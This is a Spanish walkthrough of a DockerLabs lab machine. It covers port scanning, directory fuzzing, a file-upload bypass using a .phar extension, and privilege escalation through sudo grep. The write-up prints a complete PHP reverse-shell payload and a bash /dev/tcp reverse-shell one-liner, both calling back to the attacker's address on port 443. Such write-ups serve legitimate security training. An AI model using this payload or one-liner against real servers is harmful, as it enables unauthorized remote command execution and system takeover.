Desplegamos la máquina vulnerable poniendo en la terminal la línea de comandos **bash auto_deploy.sh dockerlabs.tar** en la carpeta donde se encuentre el contenido extraído del zip.<br>
  <ins>En este caso, la dirección IP de la máquina a vulnerar es la 172.17.0.2.<ins>

  ![image](https://github.com/user-attachments/assets/ff9c5327-9da1-489f-990d-e9884d2819ac)

Ahora, realizamos un escaneo de puertos de la máquina para revisar los puertos abiertos existentes y los posibles servicios a atacar mediante el uso de esos puertos.

  ![image](https://github.com/user-attachments/assets/670f4999-346e-4be4-ba7d-57c67d3be016)

Podemos ver que se encuentra abierto el puerto ***80***, correspondiente al servicio ***HTTP***.

Nos dirigimos al navegador y escribimos la dirección URL http://172.17.0.2:80:

  ![image](https://github.com/user-attachments/assets/2b8c643f-5d4e-4ef7-b436-109fd61e95ce)

Vamos a obtener los subdirectorios existentes en la página web para conseguir visualizar otras páginas que puedan darnos más información.
Debido a que revisando el código fuente de la página y mediante el uso del comando ***ffuf*** para realizar fuzzing no detectamos nuevas páginas, vamos a emplear un comando similar llamado ***gobuster***, con el que obtendremos las páginas existentes en distintos formatos. En este caso, vamos a buscar aquellas que tengan extensión *.html*, *.php*, *.py*, *.txt*.

  ![image](https://github.com/user-attachments/assets/d55fc3f2-7b12-4e2f-910a-fec5452c4269)

El resultado de ejecutar el comando nos devuelve varios subdirectorios y archivos existentes, nosotros nos fijaremos en "**machine.php**".

  ![image](https://github.com/user-attachments/assets/c60c3305-d9dd-433c-8561-26b51f714ca7)

La página que nos aparece sirve para realizar la subida de archivos al servidor web. Por ende, podríamos realizar un ataque LFI (Local File Inclusion) que nos ayude a ejecutar una reverse shell con la que poder acceder al sistema.

Al hacer clic en el botón nos aparece este mensaje por pantalla:

  ![image](https://github.com/user-attachments/assets/52da24b9-0a28-41d5-9aed-b1e1e4d22260)

En lugar de subir un fichero con extensión *.zip*, lo que haremos será utilizar un archivo de tipo PHP, probando con las distintas extensiones que tiene este lenguaje de programación. Después de probar con cada una, nos percatamos de que la extensión válida es ***.phar***.

  ![image](https://github.com/user-attachments/assets/e5762bda-453c-4b9c-b37c-7d30c6951b14)

  ![image](https://github.com/user-attachments/assets/07f68c9b-99ee-4f7e-8988-c758bbad691c)

	    /*<?php /**/
	      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
	      $dis=@ini_get('disable_functions');
	      if(!empty($dis)){
	        $dis=preg_replace('/[, ]+/',',',$dis);
	        $dis=explode(',',$dis);
	        $dis=array_map('trim',$dis);
	      }else{
	        $dis=array();
	      }
	      
	    $ipaddr='172.17.0.1';
	    $port=443;
	
	    if(!function_exists('WrisYTZ')){
	      function WrisYTZ($c){
	        global $dis;
	        
	      if (FALSE !== stristr(PHP_OS, 'win' )) {
	        $c=$c." 2>&1\n";
	      }
	      $gPpr='is_callable';
	      $WEBa='in_array';
	      
	      if($gPpr('passthru')&&!$WEBa('passthru',$dis)){
	        ob_start();
	        passthru($c);
	        $o=ob_get_contents();
	        ob_end_clean();
	      }else
	      if($gPpr('system')&&!$WEBa('system',$dis)){
	        ob_start();
	        system($c);
	        $o=ob_get_contents();
	        ob_end_clean();
	      }else
	      if($gPpr('shell_exec')&&!$WEBa('shell_exec',$dis)){
	        $o=`$c`;
	      }else
	      if($gPpr('popen')&&!$WEBa('popen',$dis)){
	        $fp=popen($c,'r');
	        $o=NULL;
	        if(is_resource($fp)){
	          while(!feof($fp)){
	            $o.=fread($fp,1024);
	          }
	        }
	        @pclose($fp);
	      }else
	      if($gPpr('proc_open')&&!$WEBa('proc_open',$dis)){
	        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
	        $o=NULL;
	        while(!feof($pipes[1])){
	          $o.=fread($pipes[1],1024);
	        }
	        @proc_close($handle);
	      }else
	      if($gPpr('exec')&&!$WEBa('exec',$dis)){
	        $o=array();
	        exec($c,$o);
	        $o=join(chr(10),$o).chr(10);
	      }else
	      {
	        $o=0;
	      }
	    
	        return $o;
	      }
	    }
	    $nofuncs='no exec functions';
	    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
	      $s=@fsockopen("tcp://172.17.0.1",$port);
	      while($c=fread($s,2048)){
	        $out = '';
	        if(substr($c,0,3) == 'cd '){
	          chdir(substr($c,3,-1));
	        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
	          break;
	        }else{
	          $out=WrisYTZ(substr($c,0,-1));
	          if($out===false){
	            fwrite($s,$nofuncs);
	            break;
	          }
	        }
	        fwrite($s,$out);
	      }
	      fclose($s);
	    }else{
	      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
	      @socket_connect($s,$ipaddr,$port);
	      @socket_write($s,"socket_create");
	      while($c=@socket_read($s,2048)){
	        $out = '';
	        if(substr($c,0,3) == 'cd '){
	          chdir(substr($c,3,-1));
	        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
	          break;
	        }else{
	          $out=WrisYTZ(substr($c,0,-1));
	          if($out===false){
	            @socket_write($s,$nofuncs);
	            break;
	          }
	        }
	        @socket_write($s,$out,strlen($out));
	      }
	      @socket_close($s);
    }

Nos dirigimos a "**/uploads**".

  ![image](https://github.com/user-attachments/assets/1bba13c6-5ffe-4e4c-8ae7-4d3125abbe0c)

Nos ponemos en escucha por NetCat por el puerto 443:

  ![image](https://github.com/user-attachments/assets/82c6c487-1fac-43e0-8f99-4bb1a42114a2)

Ejecutamos el archivo pwned.phar haciendo clic en él para realizar la reverse shell:

  ![image](https://github.com/user-attachments/assets/9c4450d6-197a-4701-9bad-4d93d34701c9)

Dentro de la conexión remota realizamos una reverse shell desde línea de comandos usando la página web de [Revshells](https://www.revshells.com/).

**bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"**

  ![image](https://github.com/user-attachments/assets/ba780315-356d-4596-b25d-db1973c9b46a)

  ![image](https://github.com/user-attachments/assets/9f33505e-7fb1-4ed6-8174-2cbe66f57a2c)

Ahora ya nos encontramos dentro del sistema como el usuario *www-data*, por lo que ahora nos centraremos en la escalada de privilegios.

Al ejecutar el comando **sudo -l** para visualizar los archivos binarios que puede ejecutar el usuario www-data, vemos que este usuario puede ejecutar los binarios /usr/bin/cut y usr/bin/grep como usuario root, sin necesidad de ingresar su contraseña.

  ![image](https://github.com/user-attachments/assets/deb89837-d431-48d8-958e-32f9efc1d943)

Realizando búsquedas en directorios como */opt*, nos percatamos de que existe un archivo de texto llamado **nota.txt** que cuenta con esta información:

  ![image](https://github.com/user-attachments/assets/319a39e0-d789-45ef-8a3c-08fe91c07ff3)

Al parecer la contraseña del usuario root se encuentra almacenada en un archivo de texto en la ruta */root*.

Miramos en [GTFOBins](https://gtfobins.github.io/) acerca del binario ***/usr/bin/grep***.

  ![image](https://github.com/user-attachments/assets/c6d2b194-52f4-4e2d-ad24-fb8b088d28ba)

  ![image](https://github.com/user-attachments/assets/9d85430f-b191-4e16-83fe-7cf308d8ac4a)

Hemos obtenido la clave del usuario root, por lo que ahora tendremos todos los privilegios en el sistema.

  ![image](https://github.com/user-attachments/assets/23dd3669-1aa2-4f7f-9395-cf937d1bcca0)

La escalada de privilegios se ha realizado de manera exitosa.

Una vez finalizamos con la máquina de Dockerlabs presionamos **Ctrl+C** para eliminarla.

  ![image](https://github.com/user-attachments/assets/0d1d2df8-ac39-414e-93d7-e827c268f453)
